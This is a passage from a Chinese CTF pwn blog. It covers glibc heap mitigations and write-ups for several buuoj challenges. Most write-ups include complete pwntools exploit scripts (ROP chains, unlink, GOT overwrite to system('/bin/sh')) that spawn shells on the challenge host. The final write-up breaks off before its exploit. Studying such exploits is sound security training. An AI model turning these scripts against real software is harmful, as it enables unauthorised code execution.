<h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><ul>
<li>释放6个0x100的chunk到tcache bin中</li>
<li>构造两个0x100的small bin（利用Unsorted bin或Large bin切割得到）</li>
<li>修改后插入的small bin的 bk 指针为目标地址-0x10，且保持fd指针不变</li>
<li>用calloc分配0x100的chunk</li>
</ul>
<h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><ul>
<li>在目标地址上写入原本small bin上的 bk 指针内容</li>
</ul>
<h2 id="libc-2-32-so"><a href="#libc-2-32-so" class="headerlink" title="libc-2.32.so"></a>libc-2.32.so</h2><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (SINGLE_THREAD_P)  <br>&#123;<br>    <span class="hljs-comment">/* Check that the top of the bin is not the record we are going to</span><br><span class="hljs-comment">        add (i.e., double free).  */</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect(old == p, <span class="hljs-number">0</span>))<br>        malloc_printerr(<span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>);<br>    p-&gt;fd = PROTECT_PTR(&amp;p-&gt;fd, old);<br>    *fb = p;<br>&#125;<br><span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">do</span><br>    &#123;<br>        <span class="hljs-comment">/* Check that the top of the bin is not the record we are going to</span><br><span class="hljs-comment">            add (i.e., double free).  */</span><br>        <span class="hljs-keyword">if</span> (__builtin_expect(old == p, <span class="hljs-number">0</span>))<br>            malloc_printerr(<span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>);<br>        old2 = old;<br>        p-&gt;fd = PROTECT_PTR(&amp;p-&gt;fd, old);<br>    &#125; <span class="hljs-keyword">while</span> ((old = catomic_compare_and_exchange_val_rel(fb, p, old2))<br>        != old2);<br></code></pre></td></tr></table></figure>

<p>上面是glibc2.32下的fastbin源码，同样存在跟tcache一样的保护机制，会对 fd 指针进行异或处理</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>由于这个检测的存在，我们 tcache 申请的地址似乎要做到 0x10 对齐（x64）</p>
<h2 id="libc-2-34-so"><a href="#libc-2-34-so" class="headerlink" title="libc-2.34.so"></a>libc-2.34.so</h2><p>该版本删除了各种 hook 函数，所以要更换思路，一般可以通过 FSOP 攻击输出流的函数虚表 </p>
]]></content>
      <tags>
        <tag>glibc</tag>
      </tags>
  </entry>
  <entry>
    <title>buu07</title>
    <url>/2021/08/12/2021-08-12-buu07/</url>
    <content><![CDATA[<h2 id="一、xdctf2015-pwn200"><a href="#一、xdctf2015-pwn200" class="headerlink" title="一、xdctf2015_pwn200"></a>一、xdctf2015_pwn200</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210812185855607.png"><span class="image-caption">image-20210812185855607</span></p>
<p>checksec一下，32位，开了nx</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210812192549644.png"><span class="image-caption">image-20210812192549644</span></p>
<p>程序很简单，这边有个很明显的栈溢出，并且程序含有泄露函数write，构造基础的rop就行了</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210812192512692.png"><span class="image-caption">image-20210812192512692</span></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25644</span>)<br><span class="hljs-comment">#p=process(&#x27;./bof&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./bof&#x27;</span>)<br>main=<span class="hljs-number">0x80484d6</span><br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-comment">#gdb.attach(p)</span><br><br>p.recvline()<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>+p32(write_plt)+p32(main)+p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br>p.sendline(payload)<br>write=u32(p.recv(<span class="hljs-number">4</span>))<br>log.info(<span class="hljs-string">&quot;write addr:&quot;</span>+<span class="hljs-built_in">hex</span>(write))<br>libc=LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>,write)<br>libc_base=write-libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>+p32(system)+p32(main)+p32(binsh)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="二、jarvisoj-level6-x64"><a href="#二、jarvisoj-level6-x64" class="headerlink" title="二、jarvisoj_level6_x64"></a>二、jarvisoj_level6_x64</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210812200521406.png"><span class="image-caption">image-20210812200521406</span></p>
<p>看附件名字，应该是道堆题，这道堆题没开PIE，RELRO没开全，这种题目一般是想办法修改got表，这样能稳定getshell</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210914200255661.png"><span class="image-caption">image-20210914200255661</span></p>
<p>首先，创建了一个大堆块，用来保存后面申请堆块的size，指针等信息</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210914200621734.png"><span class="image-caption">image-20210914200621734</span></p>
<p>在申请堆块功能里的这个语句代表分配堆块的大小是0x80的整数倍</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210914200526193-16316211508721.png"><span class="image-caption">image-20210914200526193</span></p>
<p>在edit功能中，如果你写入与之前申请不匹配的size，那么会调用realloc扩充堆块的size，似乎可以造成overlap</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210914200603042-16316211674692.png"><span class="image-caption">image-20210914200603042</span></p>
<p>free功能的话，堆结构里面的指针没有清零，存在UAF。但是前面的flag、size都清零了，所以只能double free</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210914202759594.png"><span class="image-caption">image-20210914202759594</span></p>
<p>有个注意点是在申请堆块中的输入堆块内容时，你输入多大的size，那你相应就要填入多大的字符，否则这边的read是不会停止的</p>
<p>思路：就先checksec看到的，去劫持got表，一般是free，然后再去释放一个内容为/bin/sh的堆块。这题堆块内容没有清空，并且申请堆块时输入的数据是可以不输入\x00的，所以不会截断，那就说明蕴含着很多脏数据都是可以泄露的！比如libc，比如堆地址，而如果有了堆地址，unlink，随之而来，然后PIE又没开，直接写got表地址，然后写入system地址即可！</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210914204249244.png"><span class="image-caption">image-20210914204249244</span></p>
<p>这边释放堆块要注意，得先申请四个，然后隔着释放，因为都是unsorted chunk，得要防止触发unlink合并</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210914211338216.png"><span class="image-caption">image-20210914211338216</span></p>
<p>释放完四个堆块后，有残余脏数据的堆结构，现在就要依据这个脏数据进行构造unlink</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210914212020955.png"><span class="image-caption">image-20210914212020955</span></p>
<p>很明显，申请出来的，只能在第三个堆地址上伪造出堆头，这样才能释放该伪造堆块，触发unlink</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210915103319358.png"><span class="image-caption">image-20210915103319358</span></p>
<p>unlink成功，把堆块指针的值变为了堆结构上的地址，之后直接对着堆结构修改即可</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210915110109421.png"><span class="image-caption">image-20210915110109421</span></p>
<p>getshell！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./freenote_x64&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27343</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Length of new note: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;Enter your note: &quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Note number: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;Length of note: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;Enter your note: &quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Note number: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>) <span class="hljs-comment">#0 </span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x80</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0x80</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;d&#x27;</span>*<span class="hljs-number">0x80</span>) <span class="hljs-comment">#3</span><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>) <span class="hljs-comment">#因为会凑齐0x80的大小，所以也是相当于申请出0x80的堆</span><br>add(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x8</span>)<br>show()<br>p.recvuntil(<span class="hljs-string">&quot;0. aaaaaaaa&quot;</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">4</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">6464</span> <span class="hljs-comment">#接收四个，是因为打远程时，发现堆地址就是四个字节的</span><br>log.success(<span class="hljs-string">&quot;heap_base==&gt;0x%x&quot;</span> %heap_base)<br>p.recvuntil(<span class="hljs-string">&quot;2. bbbbbbbb&quot;</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">3951480</span><br>log.success(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">0</span>) <span class="hljs-comment">#清空堆块，为了后续借用UAF进行unlink</span><br><br><span class="hljs-comment">#unlink</span><br>payload = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x110</span>) + p64(heap_base + <span class="hljs-number">0x30</span> - <span class="hljs-number">0x18</span>) + p64(heap_base + <span class="hljs-number">0x30</span> - <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-built_in">len</span>(payload),payload)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0x110</span>) + p64(<span class="hljs-number">0x90</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x91</span>) <br>add(<span class="hljs-built_in">len</span>(payload),payload)<br>free(<span class="hljs-number">2</span>)<br><br>free = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br>payload = p64(<span class="hljs-number">0x2</span>) + p64(<span class="hljs-number">0x1</span>) + p64(<span class="hljs-number">0x8</span>) + p64(free)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,payload)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x8</span>,p64(system))<br>add(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Note number: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))   <span class="hljs-comment">#不知道为什么，这里不这样输入，没办法getshell</span><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="三、inndy-rop"><a href="#三、inndy-rop" class="headerlink" title="三、inndy_rop"></a>三、inndy_rop</h2><p>先checksec一下，32位，只开了nx</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210823202233200.png"><span class="image-caption">image-20210823202233200</span></p>
<p>进入ida，程序很简单，只有一个gets函数，明显溢出</p>
<p>然后程序东西很繁杂，这种就是属于静态编译的程序，程序里面包含着程序所需要的函数信息，但是找了一下，没有找到/bin/sh，以及system，那应该就是要构造gadgets了，去使用系统调用号函数获取shell</p>
<img src="/2021/08/12/2021-08-12-buu07/image-20210823195230792.png" style="zoom:80%;"><span class="image-caption">image-20210823195230792</span>

<p>百度了一下，ROPgadget内置了相关工具，可以直接针对这种题目有现成的exp</p>
<p><code>ROPgadget --binary rop --ropchain</code></p>
<img src="/2021/08/12/2021-08-12-buu07/image-20210823195052520.png" style="zoom:80%;"><span class="image-caption">image-20210823195052520</span>

<p><img src="/2021/08/12/2021-08-12-buu07/image-20210823201506833.png"><span class="image-caption">image-20210823201506833</span></p>
<p>这边其实还有种办法，就是使用mprotect函数修改.bss段的执行权限，然后写入shellcode，再执行来getshell</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210823201429425.png"><span class="image-caption">image-20210823201429425</span></p>
<p>程序里面是有mprotect函数的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29804</span>)<br>p = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">16</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea060</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080b8016</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += <span class="hljs-string">&#x27;/bin&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805466b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea064</span>) <span class="hljs-comment"># @ .data + 4</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080b8016</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += <span class="hljs-string">&#x27;//sh&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805466b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080492d3</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805466b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080481c9</span>) <span class="hljs-comment"># pop ebx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea060</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080de769</span>) <span class="hljs-comment"># pop ecx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080492d3</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806c943</span>) <span class="hljs-comment"># int 0x80</span><br><br>r.sendline(p)<br>r.interactive()<br>r.close()<br></code></pre></td></tr></table></figure>



<h2 id="四、babyfengshui-33c3-2016"><a href="#四、babyfengshui-33c3-2016" class="headerlink" title="四、babyfengshui_33c3_2016"></a>四、babyfengshui_33c3_2016</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210823202142271.png"><span class="image-caption">image-20210823202142271</span></p>
<p>checksec一下，32位，开了NX、Canary</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210823231658268.png"><span class="image-caption">image-20210823231658268</span></p>
<p>漏洞点在于修改堆块内容里面的检查机制有问题：只要把两个堆块分开，一个在头一个在尾，那就代表着能溢出覆盖两个堆块间的所有堆块。而且这很容易就能办到，只要连续申请几次堆块，把最开始申请的释放了，然后我们申请一个被释放大小的堆块，那这个堆块就出现在了头部，而另一个就是在尾部</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210827142300094.png"><span class="image-caption">image-20210827142300094</span></p>
<p>而打印函数，认真看，是printf函数，%s，那么这是会解析一个地址，然后把这个地址上的内容打印出来，所以我们通过溢出把free的got表地址写上去，那么解析完打印出来的就是free的真实地址，从而获得libc基址</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210827143043150.png"><span class="image-caption">image-20210827143043150</span></p>
<p>同样，这边修改description的函数，也是会把description的地址传入进去修改，那么只需要对着前面已经写入free的got表地址的堆块进行这个操作，就能把system函数写进去，从而劫持got表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;./babyfengshui_33c3_2016&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&#x27;node4.buuoj.cn&#x27;, 27980)</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Add</span>(<span class="hljs-params">size, length, text</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Action: &quot;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;description: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br>	p.sendlineafter(<span class="hljs-string">&quot;name: &quot;</span>, <span class="hljs-string">&#x27;qin&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;length: &quot;</span>, <span class="hljs-built_in">str</span>(length))<br>	p.sendlineafter(<span class="hljs-string">&quot;text: &quot;</span>, text)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Del</span>(<span class="hljs-params">index</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Action: &quot;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Dis</span>(<span class="hljs-params">index</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Action: &quot;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Upd</span>(<span class="hljs-params">index, length, text</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Action: &quot;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br>	p.sendlineafter(<span class="hljs-string">&quot;length: &quot;</span>, <span class="hljs-built_in">str</span>(length))<br>	p.sendlineafter(<span class="hljs-string">&quot;text: &quot;</span>, text)<br><br>Add(<span class="hljs-number">0x80</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;qin&#x27;</span>)<br>Add(<span class="hljs-number">0x80</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;qin&#x27;</span>)<br>Add(<span class="hljs-number">0x8</span>, <span class="hljs-number">0x8</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br><br>Del(<span class="hljs-number">0</span>)<br>Add(<span class="hljs-number">0x100</span>,<span class="hljs-number">0x19c</span>,<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x198</span>+p32(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>gdb.attach(p)<br>Dis(<span class="hljs-number">1</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;description: &quot;</span>)<br>free_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;free&#x27;</span>, free_addr)<br>libc_base = free_addr - libc.dump(<span class="hljs-string">&#x27;free&#x27;</span>)<br>sys_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>Upd(<span class="hljs-number">1</span>, <span class="hljs-number">0x4</span>, p32(sys_addr))<br>Del(<span class="hljs-number">2</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>



<h2 id="五、axb-2019-fmt32"><a href="#五、axb-2019-fmt32" class="headerlink" title="五、axb_2019_fmt32"></a>五、axb_2019_fmt32</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210824223244646.png"><span class="image-caption">image-20210824223244646</span></p>
<p>惯例checksec，32位，开了NX</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210824225801805.png"><span class="image-caption">image-20210824225801805</span></p>
<p>IDA里面很明显的就是给了格式化字符串，题目也暗示了。但是由于程序内很干净，没有什么其他函数，那要getshell，就得先格式化字符串泄露出libc，再借用格式化字符串写到栈上，我想了一下，栈还要再泄露出栈地址，也可以实现（因为有个函数environ就是存了栈地址的），所以这边我转念想到劫持got表就不要这么麻烦，got地址又是直接已知的</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210824225741699.png"><span class="image-caption">image-20210824225741699</span></p>
<p>然后先计算偏移，这边可以看见，我是输入了4个a的，但是很明显是没有对齐的，所以之后写payload的时候，要先补齐一个字符，所以我们的偏移从第八个开始</p>
<p>然后这题是有限时的，所以我们利用%x$n的时候，分两次劫持，写成hn（如果hn也超时，那就hhn），这样输入更快捷。不然会timeout</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210825001757873.png"><span class="image-caption">image-20210825001757873</span></p>
<p>最后就是选择劫持strlen，刚开始是劫持printf的，但是可能是因为在之前有个地方已经调用了printf打印一句话导致出错，然后这边劫持的时候，要在/bin/sh前加上分号，因为我们输入的地方前面其实已经有一串字符串，所以要分隔开，才能识别出/bin/sh</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210825002000682.png"><span class="image-caption">image-20210825002000682</span></p>
<p>exp：</p>
